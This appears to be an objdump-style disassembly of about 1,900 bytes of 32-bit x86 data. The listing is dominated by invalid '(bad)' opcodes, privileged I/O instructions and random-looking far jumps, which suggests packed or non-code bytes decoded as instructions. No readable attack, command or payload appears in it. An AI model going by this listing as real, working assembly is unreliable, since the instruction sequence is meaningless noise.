  41c481:	fidivr WORD PTR [edi]
  41c483:	sub    eax,0x9b774adb
  41c488:	mov    DWORD PTR [edx-0xc],eax
  41c48b:	adc    DWORD PTR [edi],esp
  41c48d:	sub    BYTE PTR ds:[ebx+0x7c854497],al
  41c494:	jp     0x41c477
  41c496:	popa   
  41c497:	adc    BYTE PTR [esi-0x39],0x59
  41c49b:	imul   edi,DWORD PTR [edx+0x485fc4b5],0x79455b97
  41c4a5:	popa   
  41c4a6:	xor    BYTE PTR [eax+0x473cc113],bl
  41c4ac:	fdivr  QWORD PTR [ebp-0x12e37a79]
  41c4b2:	xchg   esi,eax
  41c4b3:	aam    0xcf
  41c4b5:	arpl   WORD PTR [eax+0x56],di
  41c4b8:	add    BYTE PTR [ebx+0x38],bh
  41c4bb:	into   
  41c4bc:	xchg   esi,eax
  41c4bd:	(bad)  
  41c4be:	retf   0x9bf1
  41c4c1:	xchg   ebp,eax
  41c4c2:	inc    ebp
  41c4c3:	jge    0x41c502
  41c4c5:	mov    bh,0x78
  41c4c7:	sub    al,al
  41c4c9:	scas   eax,DWORD PTR es:[edi]
  41c4ca:	repz jns 0x41c52d
  41c4cd:	mov    esp,0x837fd49a
  41c4d2:	dec    eax
  41c4d3:	hlt    
  41c4d4:	and    BYTE PTR [eax],0x1f
  41c4d7:	and    bh,BYTE PTR ds:0x2f549fef
  41c4dd:	(bad)  
  41c4de:	fsubr  QWORD PTR [esi]
  41c4e0:	(bad)  
  41c4e1:	cmp    al,0x22
  41c4e3:	sbb    bl,cl
  41c4e5:	inc    esi
  41c4e6:	retf   
  41c4e7:	xor    DWORD PTR [edx+0x3f],eax
  41c4ea:	icebp  
  41c4eb:	mov    bh,0x41
  41c4ed:	jb     0x41c563
  41c4ef:	mov    bh,0xc1
  41c4f1:	(bad)  [ebp+0x5bdb9252]
  41c4f7:	gs ret 0x6439
  41c4fb:	pop    esp
  41c4fc:	in     eax,0x75
  41c4fe:	loope  0x41c48d
  41c500:	mov    WORD PTR [edx],gs
  41c502:	mov    cl,0x8e
  41c504:	dec    ebp
  41c505:	mov    bl,0x7a
  41c507:	ror    edx,cl
  41c509:	mov    ch,0x60
  41c50b:	or     edi,esp
  41c50d:	ret    
  41c50e:	test   DWORD PTR [ecx+0x4bccfd2c],edx
  41c514:	jg     0x41c4a8
  41c516:	add    ch,BYTE PTR [esi+0x12]
  41c519:	add    DWORD PTR [edi+0x180cd67d],esp
  41c51f:	jns    0x41c56f
  41c521:	mov    al,ds:0x25e3a962
  41c526:	mov    eax,ds:0x32077e03
  41c52b:	test   al,0x4c
  41c52d:	sbb    eax,0x75
  41c530:	inc    esi
  41c531:	jmp    FWORD PTR [ecx]
  41c533:	jae    0x41c539
  41c535:	fdivr  QWORD PTR [edx-0x1d]
  41c538:	mov    ebp,0xb8e86080
  41c53d:	mov    al,ds:0xeea7aafe
  41c542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c543:	loopne 0x41c531
  41c545:	mov    ebp,0x5b15db30
  41c54a:	mov    bl,BYTE PTR [ebx]
  41c54c:	dec    edi
  41c54d:	xchg   edi,eax
  41c54e:	mov    dl,0xfe
  41c550:	into   
  41c551:	sub    eax,0xb5f8bd3c
  41c556:	mov    ds:0xc1e24358,al
  41c55b:	push   esp
  41c55c:	dec    ecx
  41c55d:	dec    ebp
  41c55e:	push   eax
  41c55f:	icebp  
  41c560:	retf   
  41c561:	aad    0x8d
  41c563:	and    ch,BYTE PTR [esp-0x5cfc6cd]
  41c56a:	mov    esi,0xd5b694e5
  41c56f:	loopne 0x41c532
  41c571:	rcr    bl,0xac
  41c574:	sbb    ebp,esi
  41c576:	mov    bh,0xb3
  41c578:	ret    
  41c579:	mov    eax,ds:0xc23bb73a
  41c57e:	sbb    DWORD PTR [edi-0x2],0x3f
  41c582:	test   eax,0xf38d6a6a
  41c587:	cli    
  41c588:	out    dx,al
  41c589:	pop    ecx
  41c58a:	adc    eax,0x3d2d
  41c58f:	add    BYTE PTR [eax],al
  41c591:	add    ch,ah
  41c593:	adc    al,BYTE PTR [edi]
  41c595:	dec    ebx
  41c596:	neg    DWORD PTR [edi-0x13]
  41c599:	mov    esi,0xd2d3b943
  41c59e:	popf   
  41c59f:	pop    ecx
  41c5a0:	retf   0x5b19
  41c5a3:	inc    ecx
  41c5a4:	add    DWORD PTR [eax],eax
  41c5a6:	repz add al,0x0
  41c5a9:	add    BYTE PTR [ebx+0x6a],ch
  41c5ac:	sub    DWORD PTR [ebp+0x63],esp
  41c5af:	xchg   ebp,eax
  41c5b0:	cmp    dl,0xf4
  41c5b3:	pop    edx
  41c5b4:	aaa    
  41c5b5:	mul    BYTE PTR [ebp+0x5f65e317]
  41c5bb:	shl    BYTE PTR cs:[eax+0x3ba3f220],0x8c
  41c5c3:	or     al,BYTE PTR [ebx]
  41c5c5:	lahf   
  41c5c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5c7:	add    eax,0x2e035097
  41c5cc:	sar    BYTE PTR [ecx+0x75e78fa6],0x92
  41c5d3:	xchg   ebx,eax
  41c5d4:	les    esp,FWORD PTR [ecx+0x500f928]
  41c5da:	repz push esp
  41c5dc:	mov    fs,WORD PTR [esi]
  41c5de:	sbb    al,0x95
  41c5e0:	hlt    
  41c5e1:	dec    ebx
  41c5e2:	push   ss
  41c5e3:	dec    eax
  41c5e4:	sub    BYTE PTR [edi+edx*2+0x16],bl
  41c5e8:	outs   dx,BYTE PTR ds:[esi]
  41c5e9:	mov    BYTE PTR [eax],dl
  41c5eb:	push   ecx
  41c5ec:	push   ebp
  41c5ed:	inc    esp
  41c5ee:	adc    dh,BYTE PTR [esp+ebp*4]
  41c5f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5f2:	ja     0x41c5eb
  41c5f4:	mul    DWORD PTR [ebx+0x6c]
  41c5f7:	pop    es
  41c5f8:	fsubr  QWORD PTR [eax+ecx*1]
  41c5fb:	jge    0x41c5f6
  41c5fd:	mov    edx,0x7418d968
  41c602:	mov    edx,0x770bc3ba
  41c607:	mov    dl,0xd0
  41c609:	popa   
  41c60a:	hlt    
  41c60b:	and    cl,0x1f
  41c60e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c60f:	neg    ebp
  41c611:	js     0x41c66e
  41c613:	or     BYTE PTR [ebx-0x17],bl
  41c616:	pop    edi
  41c617:	sahf   
  41c618:	jb     0x41c68c
  41c61a:	mov    ebx,0x17a3a13
  41c61f:	inc    esi
  41c620:	out    dx,al
  41c621:	mov    ds:0x1a7f0d65,eax
  41c626:	xchg   ebp,eax
  41c627:	mov    ch,0x22
  41c629:	dec    esi
  41c62a:	in     al,dx
  41c62b:	hlt    
  41c62c:	(bad)  
  41c62d:	sbb    dh,BYTE PTR [edi]
  41c62f:	adc    dh,BYTE PTR [eiz*4+0x3e8c3a3b]
  41c636:	(bad)  
  41c637:	mov    esp,0x40f37d6d
  41c63c:	fwait
  41c63d:	stc    
  41c63e:	mov    ds:0x9db1a9c1,eax
  41c643:	int3   
  41c644:	xor    al,0xc6
  41c646:	xor    ebx,ebp
  41c648:	pop    ebp
  41c649:	adc    BYTE PTR [edi-0x1e4c78b7],bl
  41c64f:	aaa    
  41c650:	popa   
  41c651:	and    esi,ecx
  41c653:	jbe    0x41c6cf
  41c655:	sub    bh,BYTE PTR [ebp+0x39baa5df]
  41c65b:	add    dl,BYTE PTR [esi]
  41c65d:	outs   dx,DWORD PTR ds:[esi]
  41c65e:	outs   dx,BYTE PTR ds:[esi]
  41c65f:	add    eax,0x5ab9c93c
  41c664:	jns    0x41c6a9
  41c666:	mov    al,0xf7
  41c668:	cld    
  41c669:	(bad)  
  41c66a:	jg     0x41c632
  41c66c:	mov    bl,BYTE PTR [esi+0x34]
  41c66f:	and    BYTE PTR [ebx],ah
  41c671:	push   ds
  41c672:	cmp    BYTE PTR [edx+0x1f8494bd],cl
  41c678:	push   cs
  41c679:	mov    bl,0x2b
  41c67b:	add    esi,ebx
  41c67d:	push   cs
  41c67e:	fist   DWORD PTR [ecx+0x8]
  41c681:	push   eax
  41c682:	xchg   edx,eax
  41c683:	(bad)  
  41c684:	add    esp,ecx
  41c686:	pop    es
  41c687:	xor    al,0x2f
  41c689:	mov    eax,0x7e558598
  41c68e:	mov    ?,WORD PTR [ecx+0x47]
  41c691:	xchg   sp,ax
  41c693:	xchg   esp,eax
  41c694:	xor    ecx,DWORD PTR [edx]
  41c696:	mov    dh,0x8d
  41c698:	or     ebp,eax
  41c69a:	int    0x20
  41c69c:	popf   
  41c69d:	hlt    
  41c69e:	jbe    0x41c6e9
  41c6a0:	add    BYTE PTR [ebx+0x720fcadd],bh
  41c6a6:	daa    
  41c6a7:	xchg   ebp,eax
  41c6a8:	inc    edi
  41c6a9:	mov    bh,0x8f
  41c6ab:	inc    eax
  41c6ac:	or     DWORD PTR [ebx+ebx*1],esi
  41c6af:	fisub  WORD PTR [esi+0x270dac65]
  41c6b5:	fwait
  41c6b6:	es popf 
  41c6b8:	push   es
  41c6b9:	push   ebp
  41c6ba:	inc    esp
  41c6bb:	add    bh,BYTE PTR [esi]
  41c6bd:	je     0x41c71c
  41c6bf:	xor    al,0x5d
  41c6c1:	sub    BYTE PTR [ebx-0x55802fab],0x33
  41c6c8:	and    eax,DWORD PTR ds:0xf1963cee
  41c6ce:	imul   eax,ecx,0xcf396bef
  41c6d4:	test   DWORD PTR [esi+edi*2],eax
  41c6d7:	jmp    0x7d5124df
  41c6dc:	add    bh,BYTE PTR ds:0x2e07ecc0
  41c6e2:	sar    BYTE PTR [esi+0x6a],cl
  41c6e5:	push   ebx
  41c6e6:	xchg   edx,eax
  41c6e7:	mov    ecx,0x8d1eccdc
  41c6ec:	mov    esi,0xb48a224c
  41c6f1:	into   
  41c6f2:	leave  
  41c6f3:	dec    edx
  41c6f4:	es pushf 
  41c6f6:	inc    esi
  41c6f7:	fwait
  41c6f8:	xchg   ebx,eax
  41c6f9:	aad    0xc0
  41c6fb:	test   eax,0x3dbd042b
  41c700:	or     BYTE PTR [ebx+0x3d],bl
  41c703:	mov    esp,0xb25ed876
  41c708:	int    0xfb
  41c70a:	mov    edi,0x8dd74312
  41c70f:	jno    0x41c719
  41c711:	loop   0x41c6b3
  41c713:	xchg   edi,eax
  41c714:	ss daa 
  41c716:	mul    BYTE PTR [esi]
  41c718:	push   ecx
  41c719:	in     eax,0xca
  41c71b:	push   esp
  41c71c:	adc    ebx,DWORD PTR [ebx-0x7e]
  41c71f:	sbb    dh,cl
  41c721:	mov    dh,0xac
  41c723:	imul   ebp
  41c725:	out    0x20,al
  41c727:	jnp    0x41c730
  41c729:	out    0x62,al
  41c72b:	mov    al,ds:0xc3aa18a5
  41c730:	push   ds
  41c731:	call   0x53aa:0xca34bb81
  41c738:	mov    dl,0xd6
  41c73a:	mov    DWORD PTR [eax+eiz*1-0x4ca4e855],ebp
  41c741:	mov    DWORD PTR [ebx],esp
  41c743:	stos   BYTE PTR es:[edi],al
  41c744:	xor    DWORD PTR [edx],esi
  41c746:	std    
  41c747:	pop    ebp
  41c748:	xchg   ebp,eax
  41c749:	and    al,0x9
  41c74b:	stc    
  41c74c:	mov    BYTE PTR [ecx+edx*2],dh
  41c74f:	sbb    DWORD PTR ds:0x24c7e98,eax
  41c755:	shr    esi,0xb8
  41c758:	in     eax,dx
  41c759:	jmp    0x9516a336
  41c75e:	push   ecx
  41c75f:	ds das 
  41c761:	xor    al,0x84
  41c764:	fld    st(2)
  41c766:	jp     0x41c708
  41c768:	fstp   QWORD PTR [edi]
  41c76a:	lods   al,BYTE PTR ds:[esi]
  41c76b:	and    al,0x9a
  41c76d:	in     al,0x44
  41c76f:	js     0x41c7e6
  41c771:	xor    bh,dh
  41c773:	imul   ebx,DWORD PTR ds:0xa7187a8d,0xffffffd5
  41c77a:	mov    esp,0xf1cce266
  41c77f:	scas   eax,DWORD PTR es:[edi]
  41c780:	out    dx,eax
  41c781:	jge    0x41c7fb
  41c783:	or     al,0x5a
  41c785:	daa    
  41c786:	mov    DWORD PTR [esi+0x6c6961b9],esp
  41c78c:	nop
  41c78d:	inc    ecx
  41c78e:	repz adc BYTE PTR [ebx+0x2f],ch
  41c792:	out    0xca,eax
  41c794:	imul   ebp,DWORD PTR [esi],0x4293c74b
  41c79a:	lods   eax,DWORD PTR ds:[esi]
  41c79b:	and    dh,BYTE PTR [ecx+0x69d7697d]
  41c7a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7a2:	push   cs
  41c7a3:	leave  
  41c7a4:	mov    ah,0x41
  41c7a6:	fsubr  DWORD PTR [esp+ebx*4]
  41c7a9:	inc    eax
  41c7aa:	dec    eax
  41c7ab:	add    eax,0x927ea0af
  41c7b0:	inc    esp
  41c7b1:	dec    eax
  41c7b2:	jmp    0x41c790
  41c7b4:	push   edi
  41c7b5:	imul   edx,DWORD PTR [edi+0x3a3afe94],0xffffffbf
  41c7bc:	mov    ch,0x37
  41c7be:	iret   
  41c7bf:	out    0x5e,al
  41c7c1:	rol    DWORD PTR [esi],0xd5
  41c7c4:	pop    esp
  41c7c5:	fdivrp st(4),st
  41c7c7:	popa   
  41c7c8:	into   
  41c7c9:	std    
  41c7ca:	bound  edi,QWORD PTR ds:0x414bc33c
  41c7d0:	xor    eax,0xbe144dfd
  41c7d5:	jo     0x41c7a6
  41c7d7:	push   ecx
  41c7d8:	push   es
  41c7d9:	(bad)
  41c7dd:	shl    BYTE PTR [ecx-0x329ff965],0xde
  41c7e4:	add    cl,BYTE PTR [ebp+0x1dc4a1c]
  41c7ea:	jle    0x41c800
  41c7ec:	mov    dh,0xdb
  41c7ee:	or     bl,BYTE PTR [edi-0x54]
  41c7f1:	jmp    0x8593:0x9a54db42
  41c7f8:	mov    ebx,tr5
  41c7fb:	into   
  41c7fc:	sbb    al,0x55
  41c7fe:	test   DWORD PTR [ebp-0x1],0x51419061
  41c805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c806:	aaa    
  41c807:	fidiv  WORD PTR [edx+esi*4]
  41c80a:	int    0xea
  41c80c:	sbb    al,0xb
  41c80e:	(bad)  [edi+0x4]
  41c811:	and    eax,0x531e3ce5
  41c816:	and    ax,0xf6a3
  41c81a:	stc    
  41c81b:	push   esp
  41c81c:	pusha  
  41c81d:	mov    cl,0xa9
  41c81f:	pop    edx
  41c820:	fst    QWORD PTR [ebp+eiz*8+0x77b7cf2]
  41c827:	popf   
  41c828:	adc    al,0x5f
  41c82a:	and    ecx,DWORD PTR [ecx+0x63]
  41c82d:	xchg   ebp,eax
  41c82e:	push   edi
  41c82f:	leave  
  41c830:	clc    
  41c831:	gs inc ebx
  41c833:	(bad)  
  41c834:	pop    ds
  41c835:	ss mov ah,0x7
  41c838:	fistp  DWORD PTR [edi-0xb]
  41c83b:	shl    BYTE PTR [esi],cl
  41c83d:	mov    ecx,0x1555cda6
  41c842:	xlat   BYTE PTR ds:[ebx]
  41c843:	retf   0xbe01
  41c846:	aas    
  41c847:	dec    esp
  41c848:	add    al,al
  41c84a:	fst    QWORD PTR [ebx-0x6beacb3b]
  41c850:	xchg   ebx,eax
  41c851:	pop    edx
  41c852:	jle    0x41c81c
  41c854:	sub    esi,eax
  41c856:	mov    edi,0x518ca154
  41c85b:	loop   0x41c8c9
  41c85d:	cmp    eax,0xfb7abe1
  41c862:	ins    BYTE PTR es:[edi],dx
  41c863:	jle    0x41c890
  41c865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c866:	ins    BYTE PTR es:[edi],dx
  41c867:	adc    eax,0x2e9462ea
  41c86c:	ret    0xd864
  41c86f:	xchg   ch,ah
  41c871:	push   ecx
  41c872:	jp     0x41c813
  41c874:	or     dh,BYTE PTR [eax-0x75]
  41c877:	dec    esi
  41c878:	retf   0xed98
  41c87b:	cld    
  41c87c:	sahf   
  41c87d:	addr16 sub eax,0x96858002
  41c883:	mov    ecx,0x39e417a0
  41c888:	adc    al,0xf
  41c88a:	xchg   esp,eax
  41c88b:	fisubr DWORD PTR [edi+edi*8]
  41c88e:	sbb    edx,DWORD PTR [eax]
  41c890:	xlat   BYTE PTR ds:[ebx]
  41c891:	push   eax
  41c892:	pop    es
  41c893:	retf   0xd059
  41c896:	mov    ah,BYTE PTR [edi]
  41c898:	lods   al,BYTE PTR ds:[esi]
  41c899:	dec    esi
  41c89a:	call   0x9f84:0x84a68c9f
  41c8a1:	sub    ch,al
  41c8a3:	mov    edi,0xb6471dd5
  41c8a8:	ror    ah,0xa7
  41c8ab:	push   0xffffffbf
  41c8ad:	pop    ecx
  41c8ae:	popf   
  41c8af:	inc    esi
  41c8b0:	jo     0x41c83b
  41c8b2:	inc    esp
  41c8b3:	pop    ds
  41c8b4:	call   0x337e:0x47b97993
  41c8bb:	(bad)  
  41c8bc:	(bad)  
  41c8bd:	fisttp DWORD PTR [edi-0x6517e927]
  41c8c3:	pop    ds
  41c8c4:	imul   edi,DWORD PTR [edi],0x4675b42d
  41c8ca:	retf   
  41c8cb:	mov    eax,0xff77e391
  41c8d0:	es jp  0x41c861
  41c8d3:	popf   
  41c8d4:	adc    DWORD PTR [ebx+0x52],edx
  41c8d7:	jno    0x41c929
  41c8d9:	aaa    
  41c8da:	loope  0x41c91a
  41c8dc:	xchg   BYTE PTR [edx+0x6c],ch
  41c8df:	jle    0x41c87a
  41c8e1:	mov    al,ds:0x456c0e4e
  41c8e6:	mov    ebx,0xd32a3e66
  41c8eb:	mov    esi,DWORD PTR [eax]
  41c8ed:	and    al,0xd4
  41c8ef:	pop    edi
  41c8f0:	popa   
  41c8f1:	jmp    0x41c949
  41c8f3:	xchg   ebp,eax
  41c8f4:	xchg   ebx,eax
  41c8f5:	add    BYTE PTR [esi-0x657d973b],0xa9
  41c8fc:	mov    eax,ds:0x480e42c7
  41c901:	push   edx
  41c902:	pop    es
  41c903:	aad    0x44
  41c905:	dec    esi
  41c906:	xchg   ebx,eax
  41c907:	in     eax,0x6c
  41c909:	cmp    edi,DWORD PTR [ecx]
  41c90b:	in     al,dx
  41c90c:	mov    edx,0x318895c1
  41c911:	jl     0x41c8c7
  41c913:	add    eax,0xc8afd0
  41c918:	std    
  41c919:	sub    edi,DWORD PTR [ebx-0x54]
  41c91c:	std    
  41c91d:	rcr    DWORD PTR [ebx+0x3b963b2d],cl
  41c923:	pop    esp
  41c924:	ret    0xb1d3
  41c927:	and    al,0x28
  41c929:	jns    0x41c8d2
  41c92b:	mov    bl,0x82
  41c92d:	(bad)  
  41c92e:	fnsave [ecx-0x14]
  41c931:	aaa    
  41c932:	out    0xe2,eax
  41c934:	and    eax,0x9872e92b
  41c939:	call   0x2266:0x25e9c8c
  41c940:	inc    ebx
  41c941:	(bad)  
  41c942:	test   eax,0x7ad7a9ef
  41c947:	retf   0x53de
  41c94a:	or     DWORD PTR [eax+ebp*4+0x56b7c4da],esp
  41c951:	js     0x41c9af
  41c953:	outs   dx,BYTE PTR ds:[esi]
  41c954:	adc    BYTE PTR [ebx],0x3b
  41c957:	sub    al,0x2f
  41c959:	mov    ds:0xbd00ac6,eax
  41c95e:	arpl   WORD PTR [ecx+0x1d2905a2],di
  41c964:	into   
  41c965:	loopne 0x41c90e
  41c967:	jmp    0xabcbcb92
  41c96c:	enter  0x7aee,0xd
  41c970:	mov    ch,0x93
  41c972:	jmp    0xae6c:0x684640f5
  41c979:	xor    ah,dl
  41c97b:	cmp    ebp,DWORD PTR [ebx]
  41c97d:	and    al,BYTE PTR [ebp-0x1e]
  41c980:	scas   al,BYTE PTR es:[edi]
  41c981:	push   esi
  41c982:	imul   ecx,DWORD PTR [ebp+0x4b],0xffffff85
  41c986:	lahf   
  41c987:	xor    dh,BYTE PTR [ebx-0x4283941e]
  41c98d:	jge    0x41c9d8
  41c98f:	and    eax,0x538ef7a6
  41c994:	stos   BYTE PTR es:[edi],al
  41c995:	sbb    eax,0x8a001fe8
  41c99a:	pushf  
  41c99b:	inc    edi
  41c99c:	shl    DWORD PTR [eax],cl
  41c99e:	cld    
  41c99f:	mov    eax,0x6fde7bcc
  41c9a4:	cmp    bh,BYTE PTR [esi]
  41c9a6:	mov    ds:0x69967799,eax
  41c9ab:	test   BYTE PTR [eax-0x2fe38d4b],ah
  41c9b1:	mov    WORD PTR [ebx],?
  41c9b3:	xchg   edx,eax
  41c9b4:	or     eax,0x2069996e
  41c9b9:	dec    edx
  41c9ba:	rcl    DWORD PTR [ebx-0x43],0x2
  41c9be:	test   BYTE PTR [edi*2-0x61b72d4f],dh
  41c9c5:	out    dx,eax
  41c9c6:	jecxz  0x41c94e
  41c9c8:	test   DWORD PTR [ecx-0x689cfa07],edx
  41c9ce:	ret    0xbe62
  41c9d1:	clc    
  41c9d2:	pop    edx
  41c9d3:	mov    ch,0xb
  41c9d5:	call   0x44587d2d
  41c9da:	int3   
  41c9db:	sbb    BYTE PTR [ebx],0xad
  41c9de:	in     al,0x6f
  41c9e0:	push   0xe
  41c9e2:	add    al,0xb4
  41c9e4:	xchg   edx,eax
  41c9e5:	or     BYTE PTR ds:0x8e193920,cl
  41c9eb:	call   FWORD PTR [ebp-0x5c2b7af9]
  41c9f1:	call   0x1d4bcb36
  41c9f6:	push   es
  41c9f7:	sbb    al,0xff
  41c9f9:	mov    DWORD PTR [eax-0x15d036b1],edx
  41c9ff:	cmp    DWORD PTR [esi+esi*4],esp
  41ca02:	fistp  WORD PTR [ebx+edi*2+0x35]
  41ca06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca07:	mov    ah,0x4
  41ca09:	ja     0x41c9ad
  41ca0b:	pushf  
  41ca0c:	fild   DWORD PTR [ebp-0x3fc3355a]
  41ca12:	cld    
  41ca13:	test   esp,esp
  41ca15:	cwde   
  41ca16:	fst    DWORD PTR [ebx]
  41ca18:	or     edi,ebp
  41ca1a:	(bad)  
  41ca1b:	and    al,0x48
  41ca1d:	sub    bh,dh
  41ca1f:	xchg   edx,eax
  41ca20:	mov    al,0x26
  41ca22:	xchg   edx,eax
  41ca23:	imul   edi,edx,0x9
  41ca26:	and    eax,0x453e0676
  41ca2b:	mov    ds:0xdae688d1,al
  41ca30:	shl    BYTE PTR [esi-0x73],cl
  41ca33:	jecxz  0x41c9ef
  41ca35:	ret    
  41ca36:	and    al,0xe1
  41ca38:	push   0x584e0dba
  41ca3d:	dec    ecx
  41ca3e:	hlt    
  41ca3f:	in     al,0xe
  41ca41:	add    al,0xb
  41ca43:	lahf   
  41ca44:	mov    edx,0xed219d4
  41ca49:	mov    ds:0xcee81e8e,eax
  41ca4e:	push   edx
  41ca4f:	(bad)  
  41ca50:	dec    eax
  41ca51:	add    DWORD PTR [ebx-0x32],ecx
  41ca54:	outs   dx,BYTE PTR ds:[esi]
  41ca55:	lock adc esp,ebp
  41ca58:	inc    esp
  41ca59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca5a:	pop    esp
  41ca5b:	test   al,0x7b
  41ca5d:	stos   BYTE PTR es:[edi],al
  41ca5e:	rcr    al,1
  41ca60:	outs   dx,BYTE PTR ds:[esi]
  41ca61:	xchg   esi,eax
  41ca62:	mov    BYTE PTR [edi-0x3d],cl
  41ca65:	fimul  DWORD PTR [ebx+esi*1+0x3d]
  41ca69:	in     eax,dx
  41ca6a:	std    
  41ca6b:	je     0x41caa8
  41ca6d:	in     al,0x6
  41ca6f:	sub    DWORD PTR [eax],ecx
  41ca71:	push   ds
  41ca72:	sbb    DWORD PTR [esi-0x639c9c23],edi
  41ca78:	out    dx,eax
  41ca79:	jge    0x41cac4
  41ca7b:	icebp  
  41ca7c:	cmp    al,0x4b
  41ca7e:	adc    BYTE PTR [ebp-0x6d],0x53
  41ca82:	mov    dl,0x3f
  41ca84:	je     0x41caf2
  41ca86:	into   
  41ca87:	repnz dec ecx
  41ca89:	pusha  
  41ca8a:	jo     0x41caf2
  41ca8c:	fcmovu st,st(3)
  41ca8e:	out    0xb,eax
  41ca90:	mov    al,0xbb
  41ca92:	pop    ds
  41ca93:	mov    dh,0x43
  41ca95:	sbb    BYTE PTR [edi+ecx*8+0x3e0df20e],al
  41ca9c:	call   0xe400:0x0
  41caa3:	ds mov esp,ss
  41caa6:	fdivrp st(6),st
  41caa8:	cld    
  41caa9:	ds push esp
  41caab:	daa    
  41caac:	cmp    esi,DWORD PTR [edx-0xb]
  41caaf:	pop    ds
  41cab0:	popa   
  41cab1:	or     DWORD PTR [esi+0x46],0x1
  41cab5:	add    bl,dh
  41cab7:	add    al,0x0
  41cab9:	add    BYTE PTR [esi],cl
  41cabb:	mov    ah,BYTE PTR fs:[esi]
  41cabe:	adc    ebx,DWORD PTR ds:0xbadadbbc
  41cac4:	sti    
  41cac5:	mov    ds:0x46dde7d2,al
  41caca:	or     BYTE PTR [esi],ch
  41cacc:	push   ds
  41cacd:	(bad)  
  41cace:	sahf   
  41cacf:	fdivr  QWORD PTR [edx]
  41cad1:	dec    esp
  41cad2:	dec    eax
  41cad3:	xor    eax,DWORD PTR [ebx]
  41cad5:	xor    ecx,ecx
  41cad7:	xlat   BYTE PTR ds:[ebx]
  41cad8:	push   ds
  41cad9:	xor    BYTE PTR [eax+edx*2-0x75379b27],0xd5
  41cae1:	mov    ds:0xfe39d2f1,eax
  41cae6:	and    al,0xf2
  41cae8:	imul   ecx,DWORD PTR [edx+ebp*8],0xd4fd4318
  41caef:	mov    al,0x22
  41caf1:	(bad)  
  41caf2:	fs mov ch,0x43
  41caf5:	rcr    DWORD PTR [ebx+0x44],cl
  41caf8:	clc    
  41caf9:	fucom  st(4)
  41cafb:	xchg   edx,eax
  41cafc:	into   
  41cafd:	xor    eax,0x3e8390a1
  41cb02:	rcr    DWORD PTR [edi],1
  41cb04:	cli    
  41cb05:	(bad)  
  41cb06:	jmp    0x960a:0x2c2c3797
  41cb0d:	push   ebx
  41cb0e:	mov    esp,0xd03c0323
  41cb13:	pop    esp
  41cb14:	aas    
  41cb15:	mov    ds:0xd7326b54,eax
  41cb1a:	push   ecx
  41cb1b:	jae    0x41cb83
  41cb1d:	sar    DWORD PTR [eax+0x70a64f68],cl
  41cb23:	xor    al,bh
  41cb25:	inc    eax
  41cb26:	sub    ah,al
  41cb28:	dec    edi
  41cb29:	or     eax,0xb3502c6b
  41cb2e:	ror    BYTE PTR [ebp+0x759e65d2],0xf9
  41cb35:	and    ah,dh
  41cb37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb38:	add    ch,BYTE PTR [ebx]
  41cb3a:	fisub  DWORD PTR [edi-0x363a2c1b]
  41cb40:	jnp    0x41cb69
  41cb42:	jmp    0x2fe8dc00
  41cb47:	jne    0x41cbaf
  41cb49:	sahf   
  41cb4a:	into   
  41cb4b:	pavgw  mm5,QWORD PTR [eax+0x9b14baa]
  41cb52:	mov    DWORD PTR [esi-0x32eeb035],edi
  41cb58:	cmp    al,0xd1
  41cb5a:	aad    0x69
  41cb5c:	jecxz  0x41cb4b
  41cb5e:	push   esi
  41cb5f:	cmp    al,BYTE PTR [eax]
  41cb61:	mov    edx,0xda8cad38
  41cb66:	sub    al,0x72
  41cb68:	xchg   ebx,eax
  41cb69:	loope  0x41cb04
  41cb6b:	(bad)  
  41cb6c:	mov    fs,WORD PTR [esi+ebx*8+0x3f8292d9]
  41cb73:	inc    ebx
  41cb74:	mov    ecx,0xf55cd55a
  41cb79:	das    
  41cb7a:	xchg   ebp,eax
  41cb7b:	adc    DWORD PTR [ebx],eax
  41cb7d:	ins    DWORD PTR es:[edi],dx
  41cb7e:	loopne 0x41cbd3
  41cb80:	inc    ecx
  41cb81:	push   edx
  41cb82:	repz les ebx,FWORD PTR [ebx]
  41cb85:	jmp    0x82ac8e8e
  41cb8a:	push   ebx
  41cb8b:	jmp    0xc8b4b0de
  41cb90:	sub    DWORD PTR [ebp+0x6c532479],esi
  41cb96:	lea    edx,[eax+ebp*1+0x1094b704]
  41cb9d:	mov    bl,0x20
  41cb9f:	dec    esp
  41cba0:	neg    dh
  41cba2:	sub    DWORD PTR [eax],edx
  41cba4:	jp     0x41cbf8
  41cba6:	fbstp  TBYTE PTR [ebp+0x59]
  41cba9:	inc    ecx
  41cbaa:	inc    esp
  41cbab:	faddp  st(1),st
  41cbad:	sbb    ebx,DWORD PTR [edx]
  41cbaf:	mov    ebp,0x70ebeee5
  41cbb4:	loop   0x41cc14
  41cbb6:	aad    0x4f
  41cbb8:	fucompp 
  41cbba:	popf   
  41cbbb:	jnp    0x41cbde
  41cbbd:	dec    edi
  41cbbe:	pop    edx
  41cbbf:	mov    esp,0x92bf1344
  41cbc4:	inc    eax
  41cbc5:	push   ebx
  41cbc6:	lea    esi,[eax-0x5dd6637c]
  41cbcc:	xchg   ebp,eax
  41cbcd:	leave  
  41cbce:	xchg   DWORD PTR [edi],ebp
  41cbd0:	lock add dl,BYTE PTR ds:0xbb76c951
  41cbd7:	xlat   BYTE PTR ds:[ebx]
  41cbd8:	dec    esi
  41cbd9:	test   eax,0xe60fba19
  41cbde:	jg     0x41cb9a
  41cbe0:	xor    BYTE PTR [ecx],bh
  41cbe2:	and    bl,bl
  41cbe4:	xchg   edx,eax
  41cbe5:	rcl    BYTE PTR [ecx+0x35],1
  41cbe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbe9:	retf   
  41cbea:	push   ds
  41cbeb:	ror    BYTE PTR [ebp-0x77],0xba
  41cbef:	(bad)  
  41cbf0:	call   0x150db6c
  41cbf5:	aad    0xa4
  41cbf7:	lock pop ebp
  41cbf9:	fisub  WORD PTR [ebx+0x175f3e0d]
  41cbff:	es dec ecx
  41cc01:	cwde   
  41cc02:	jbe    0x41cba2
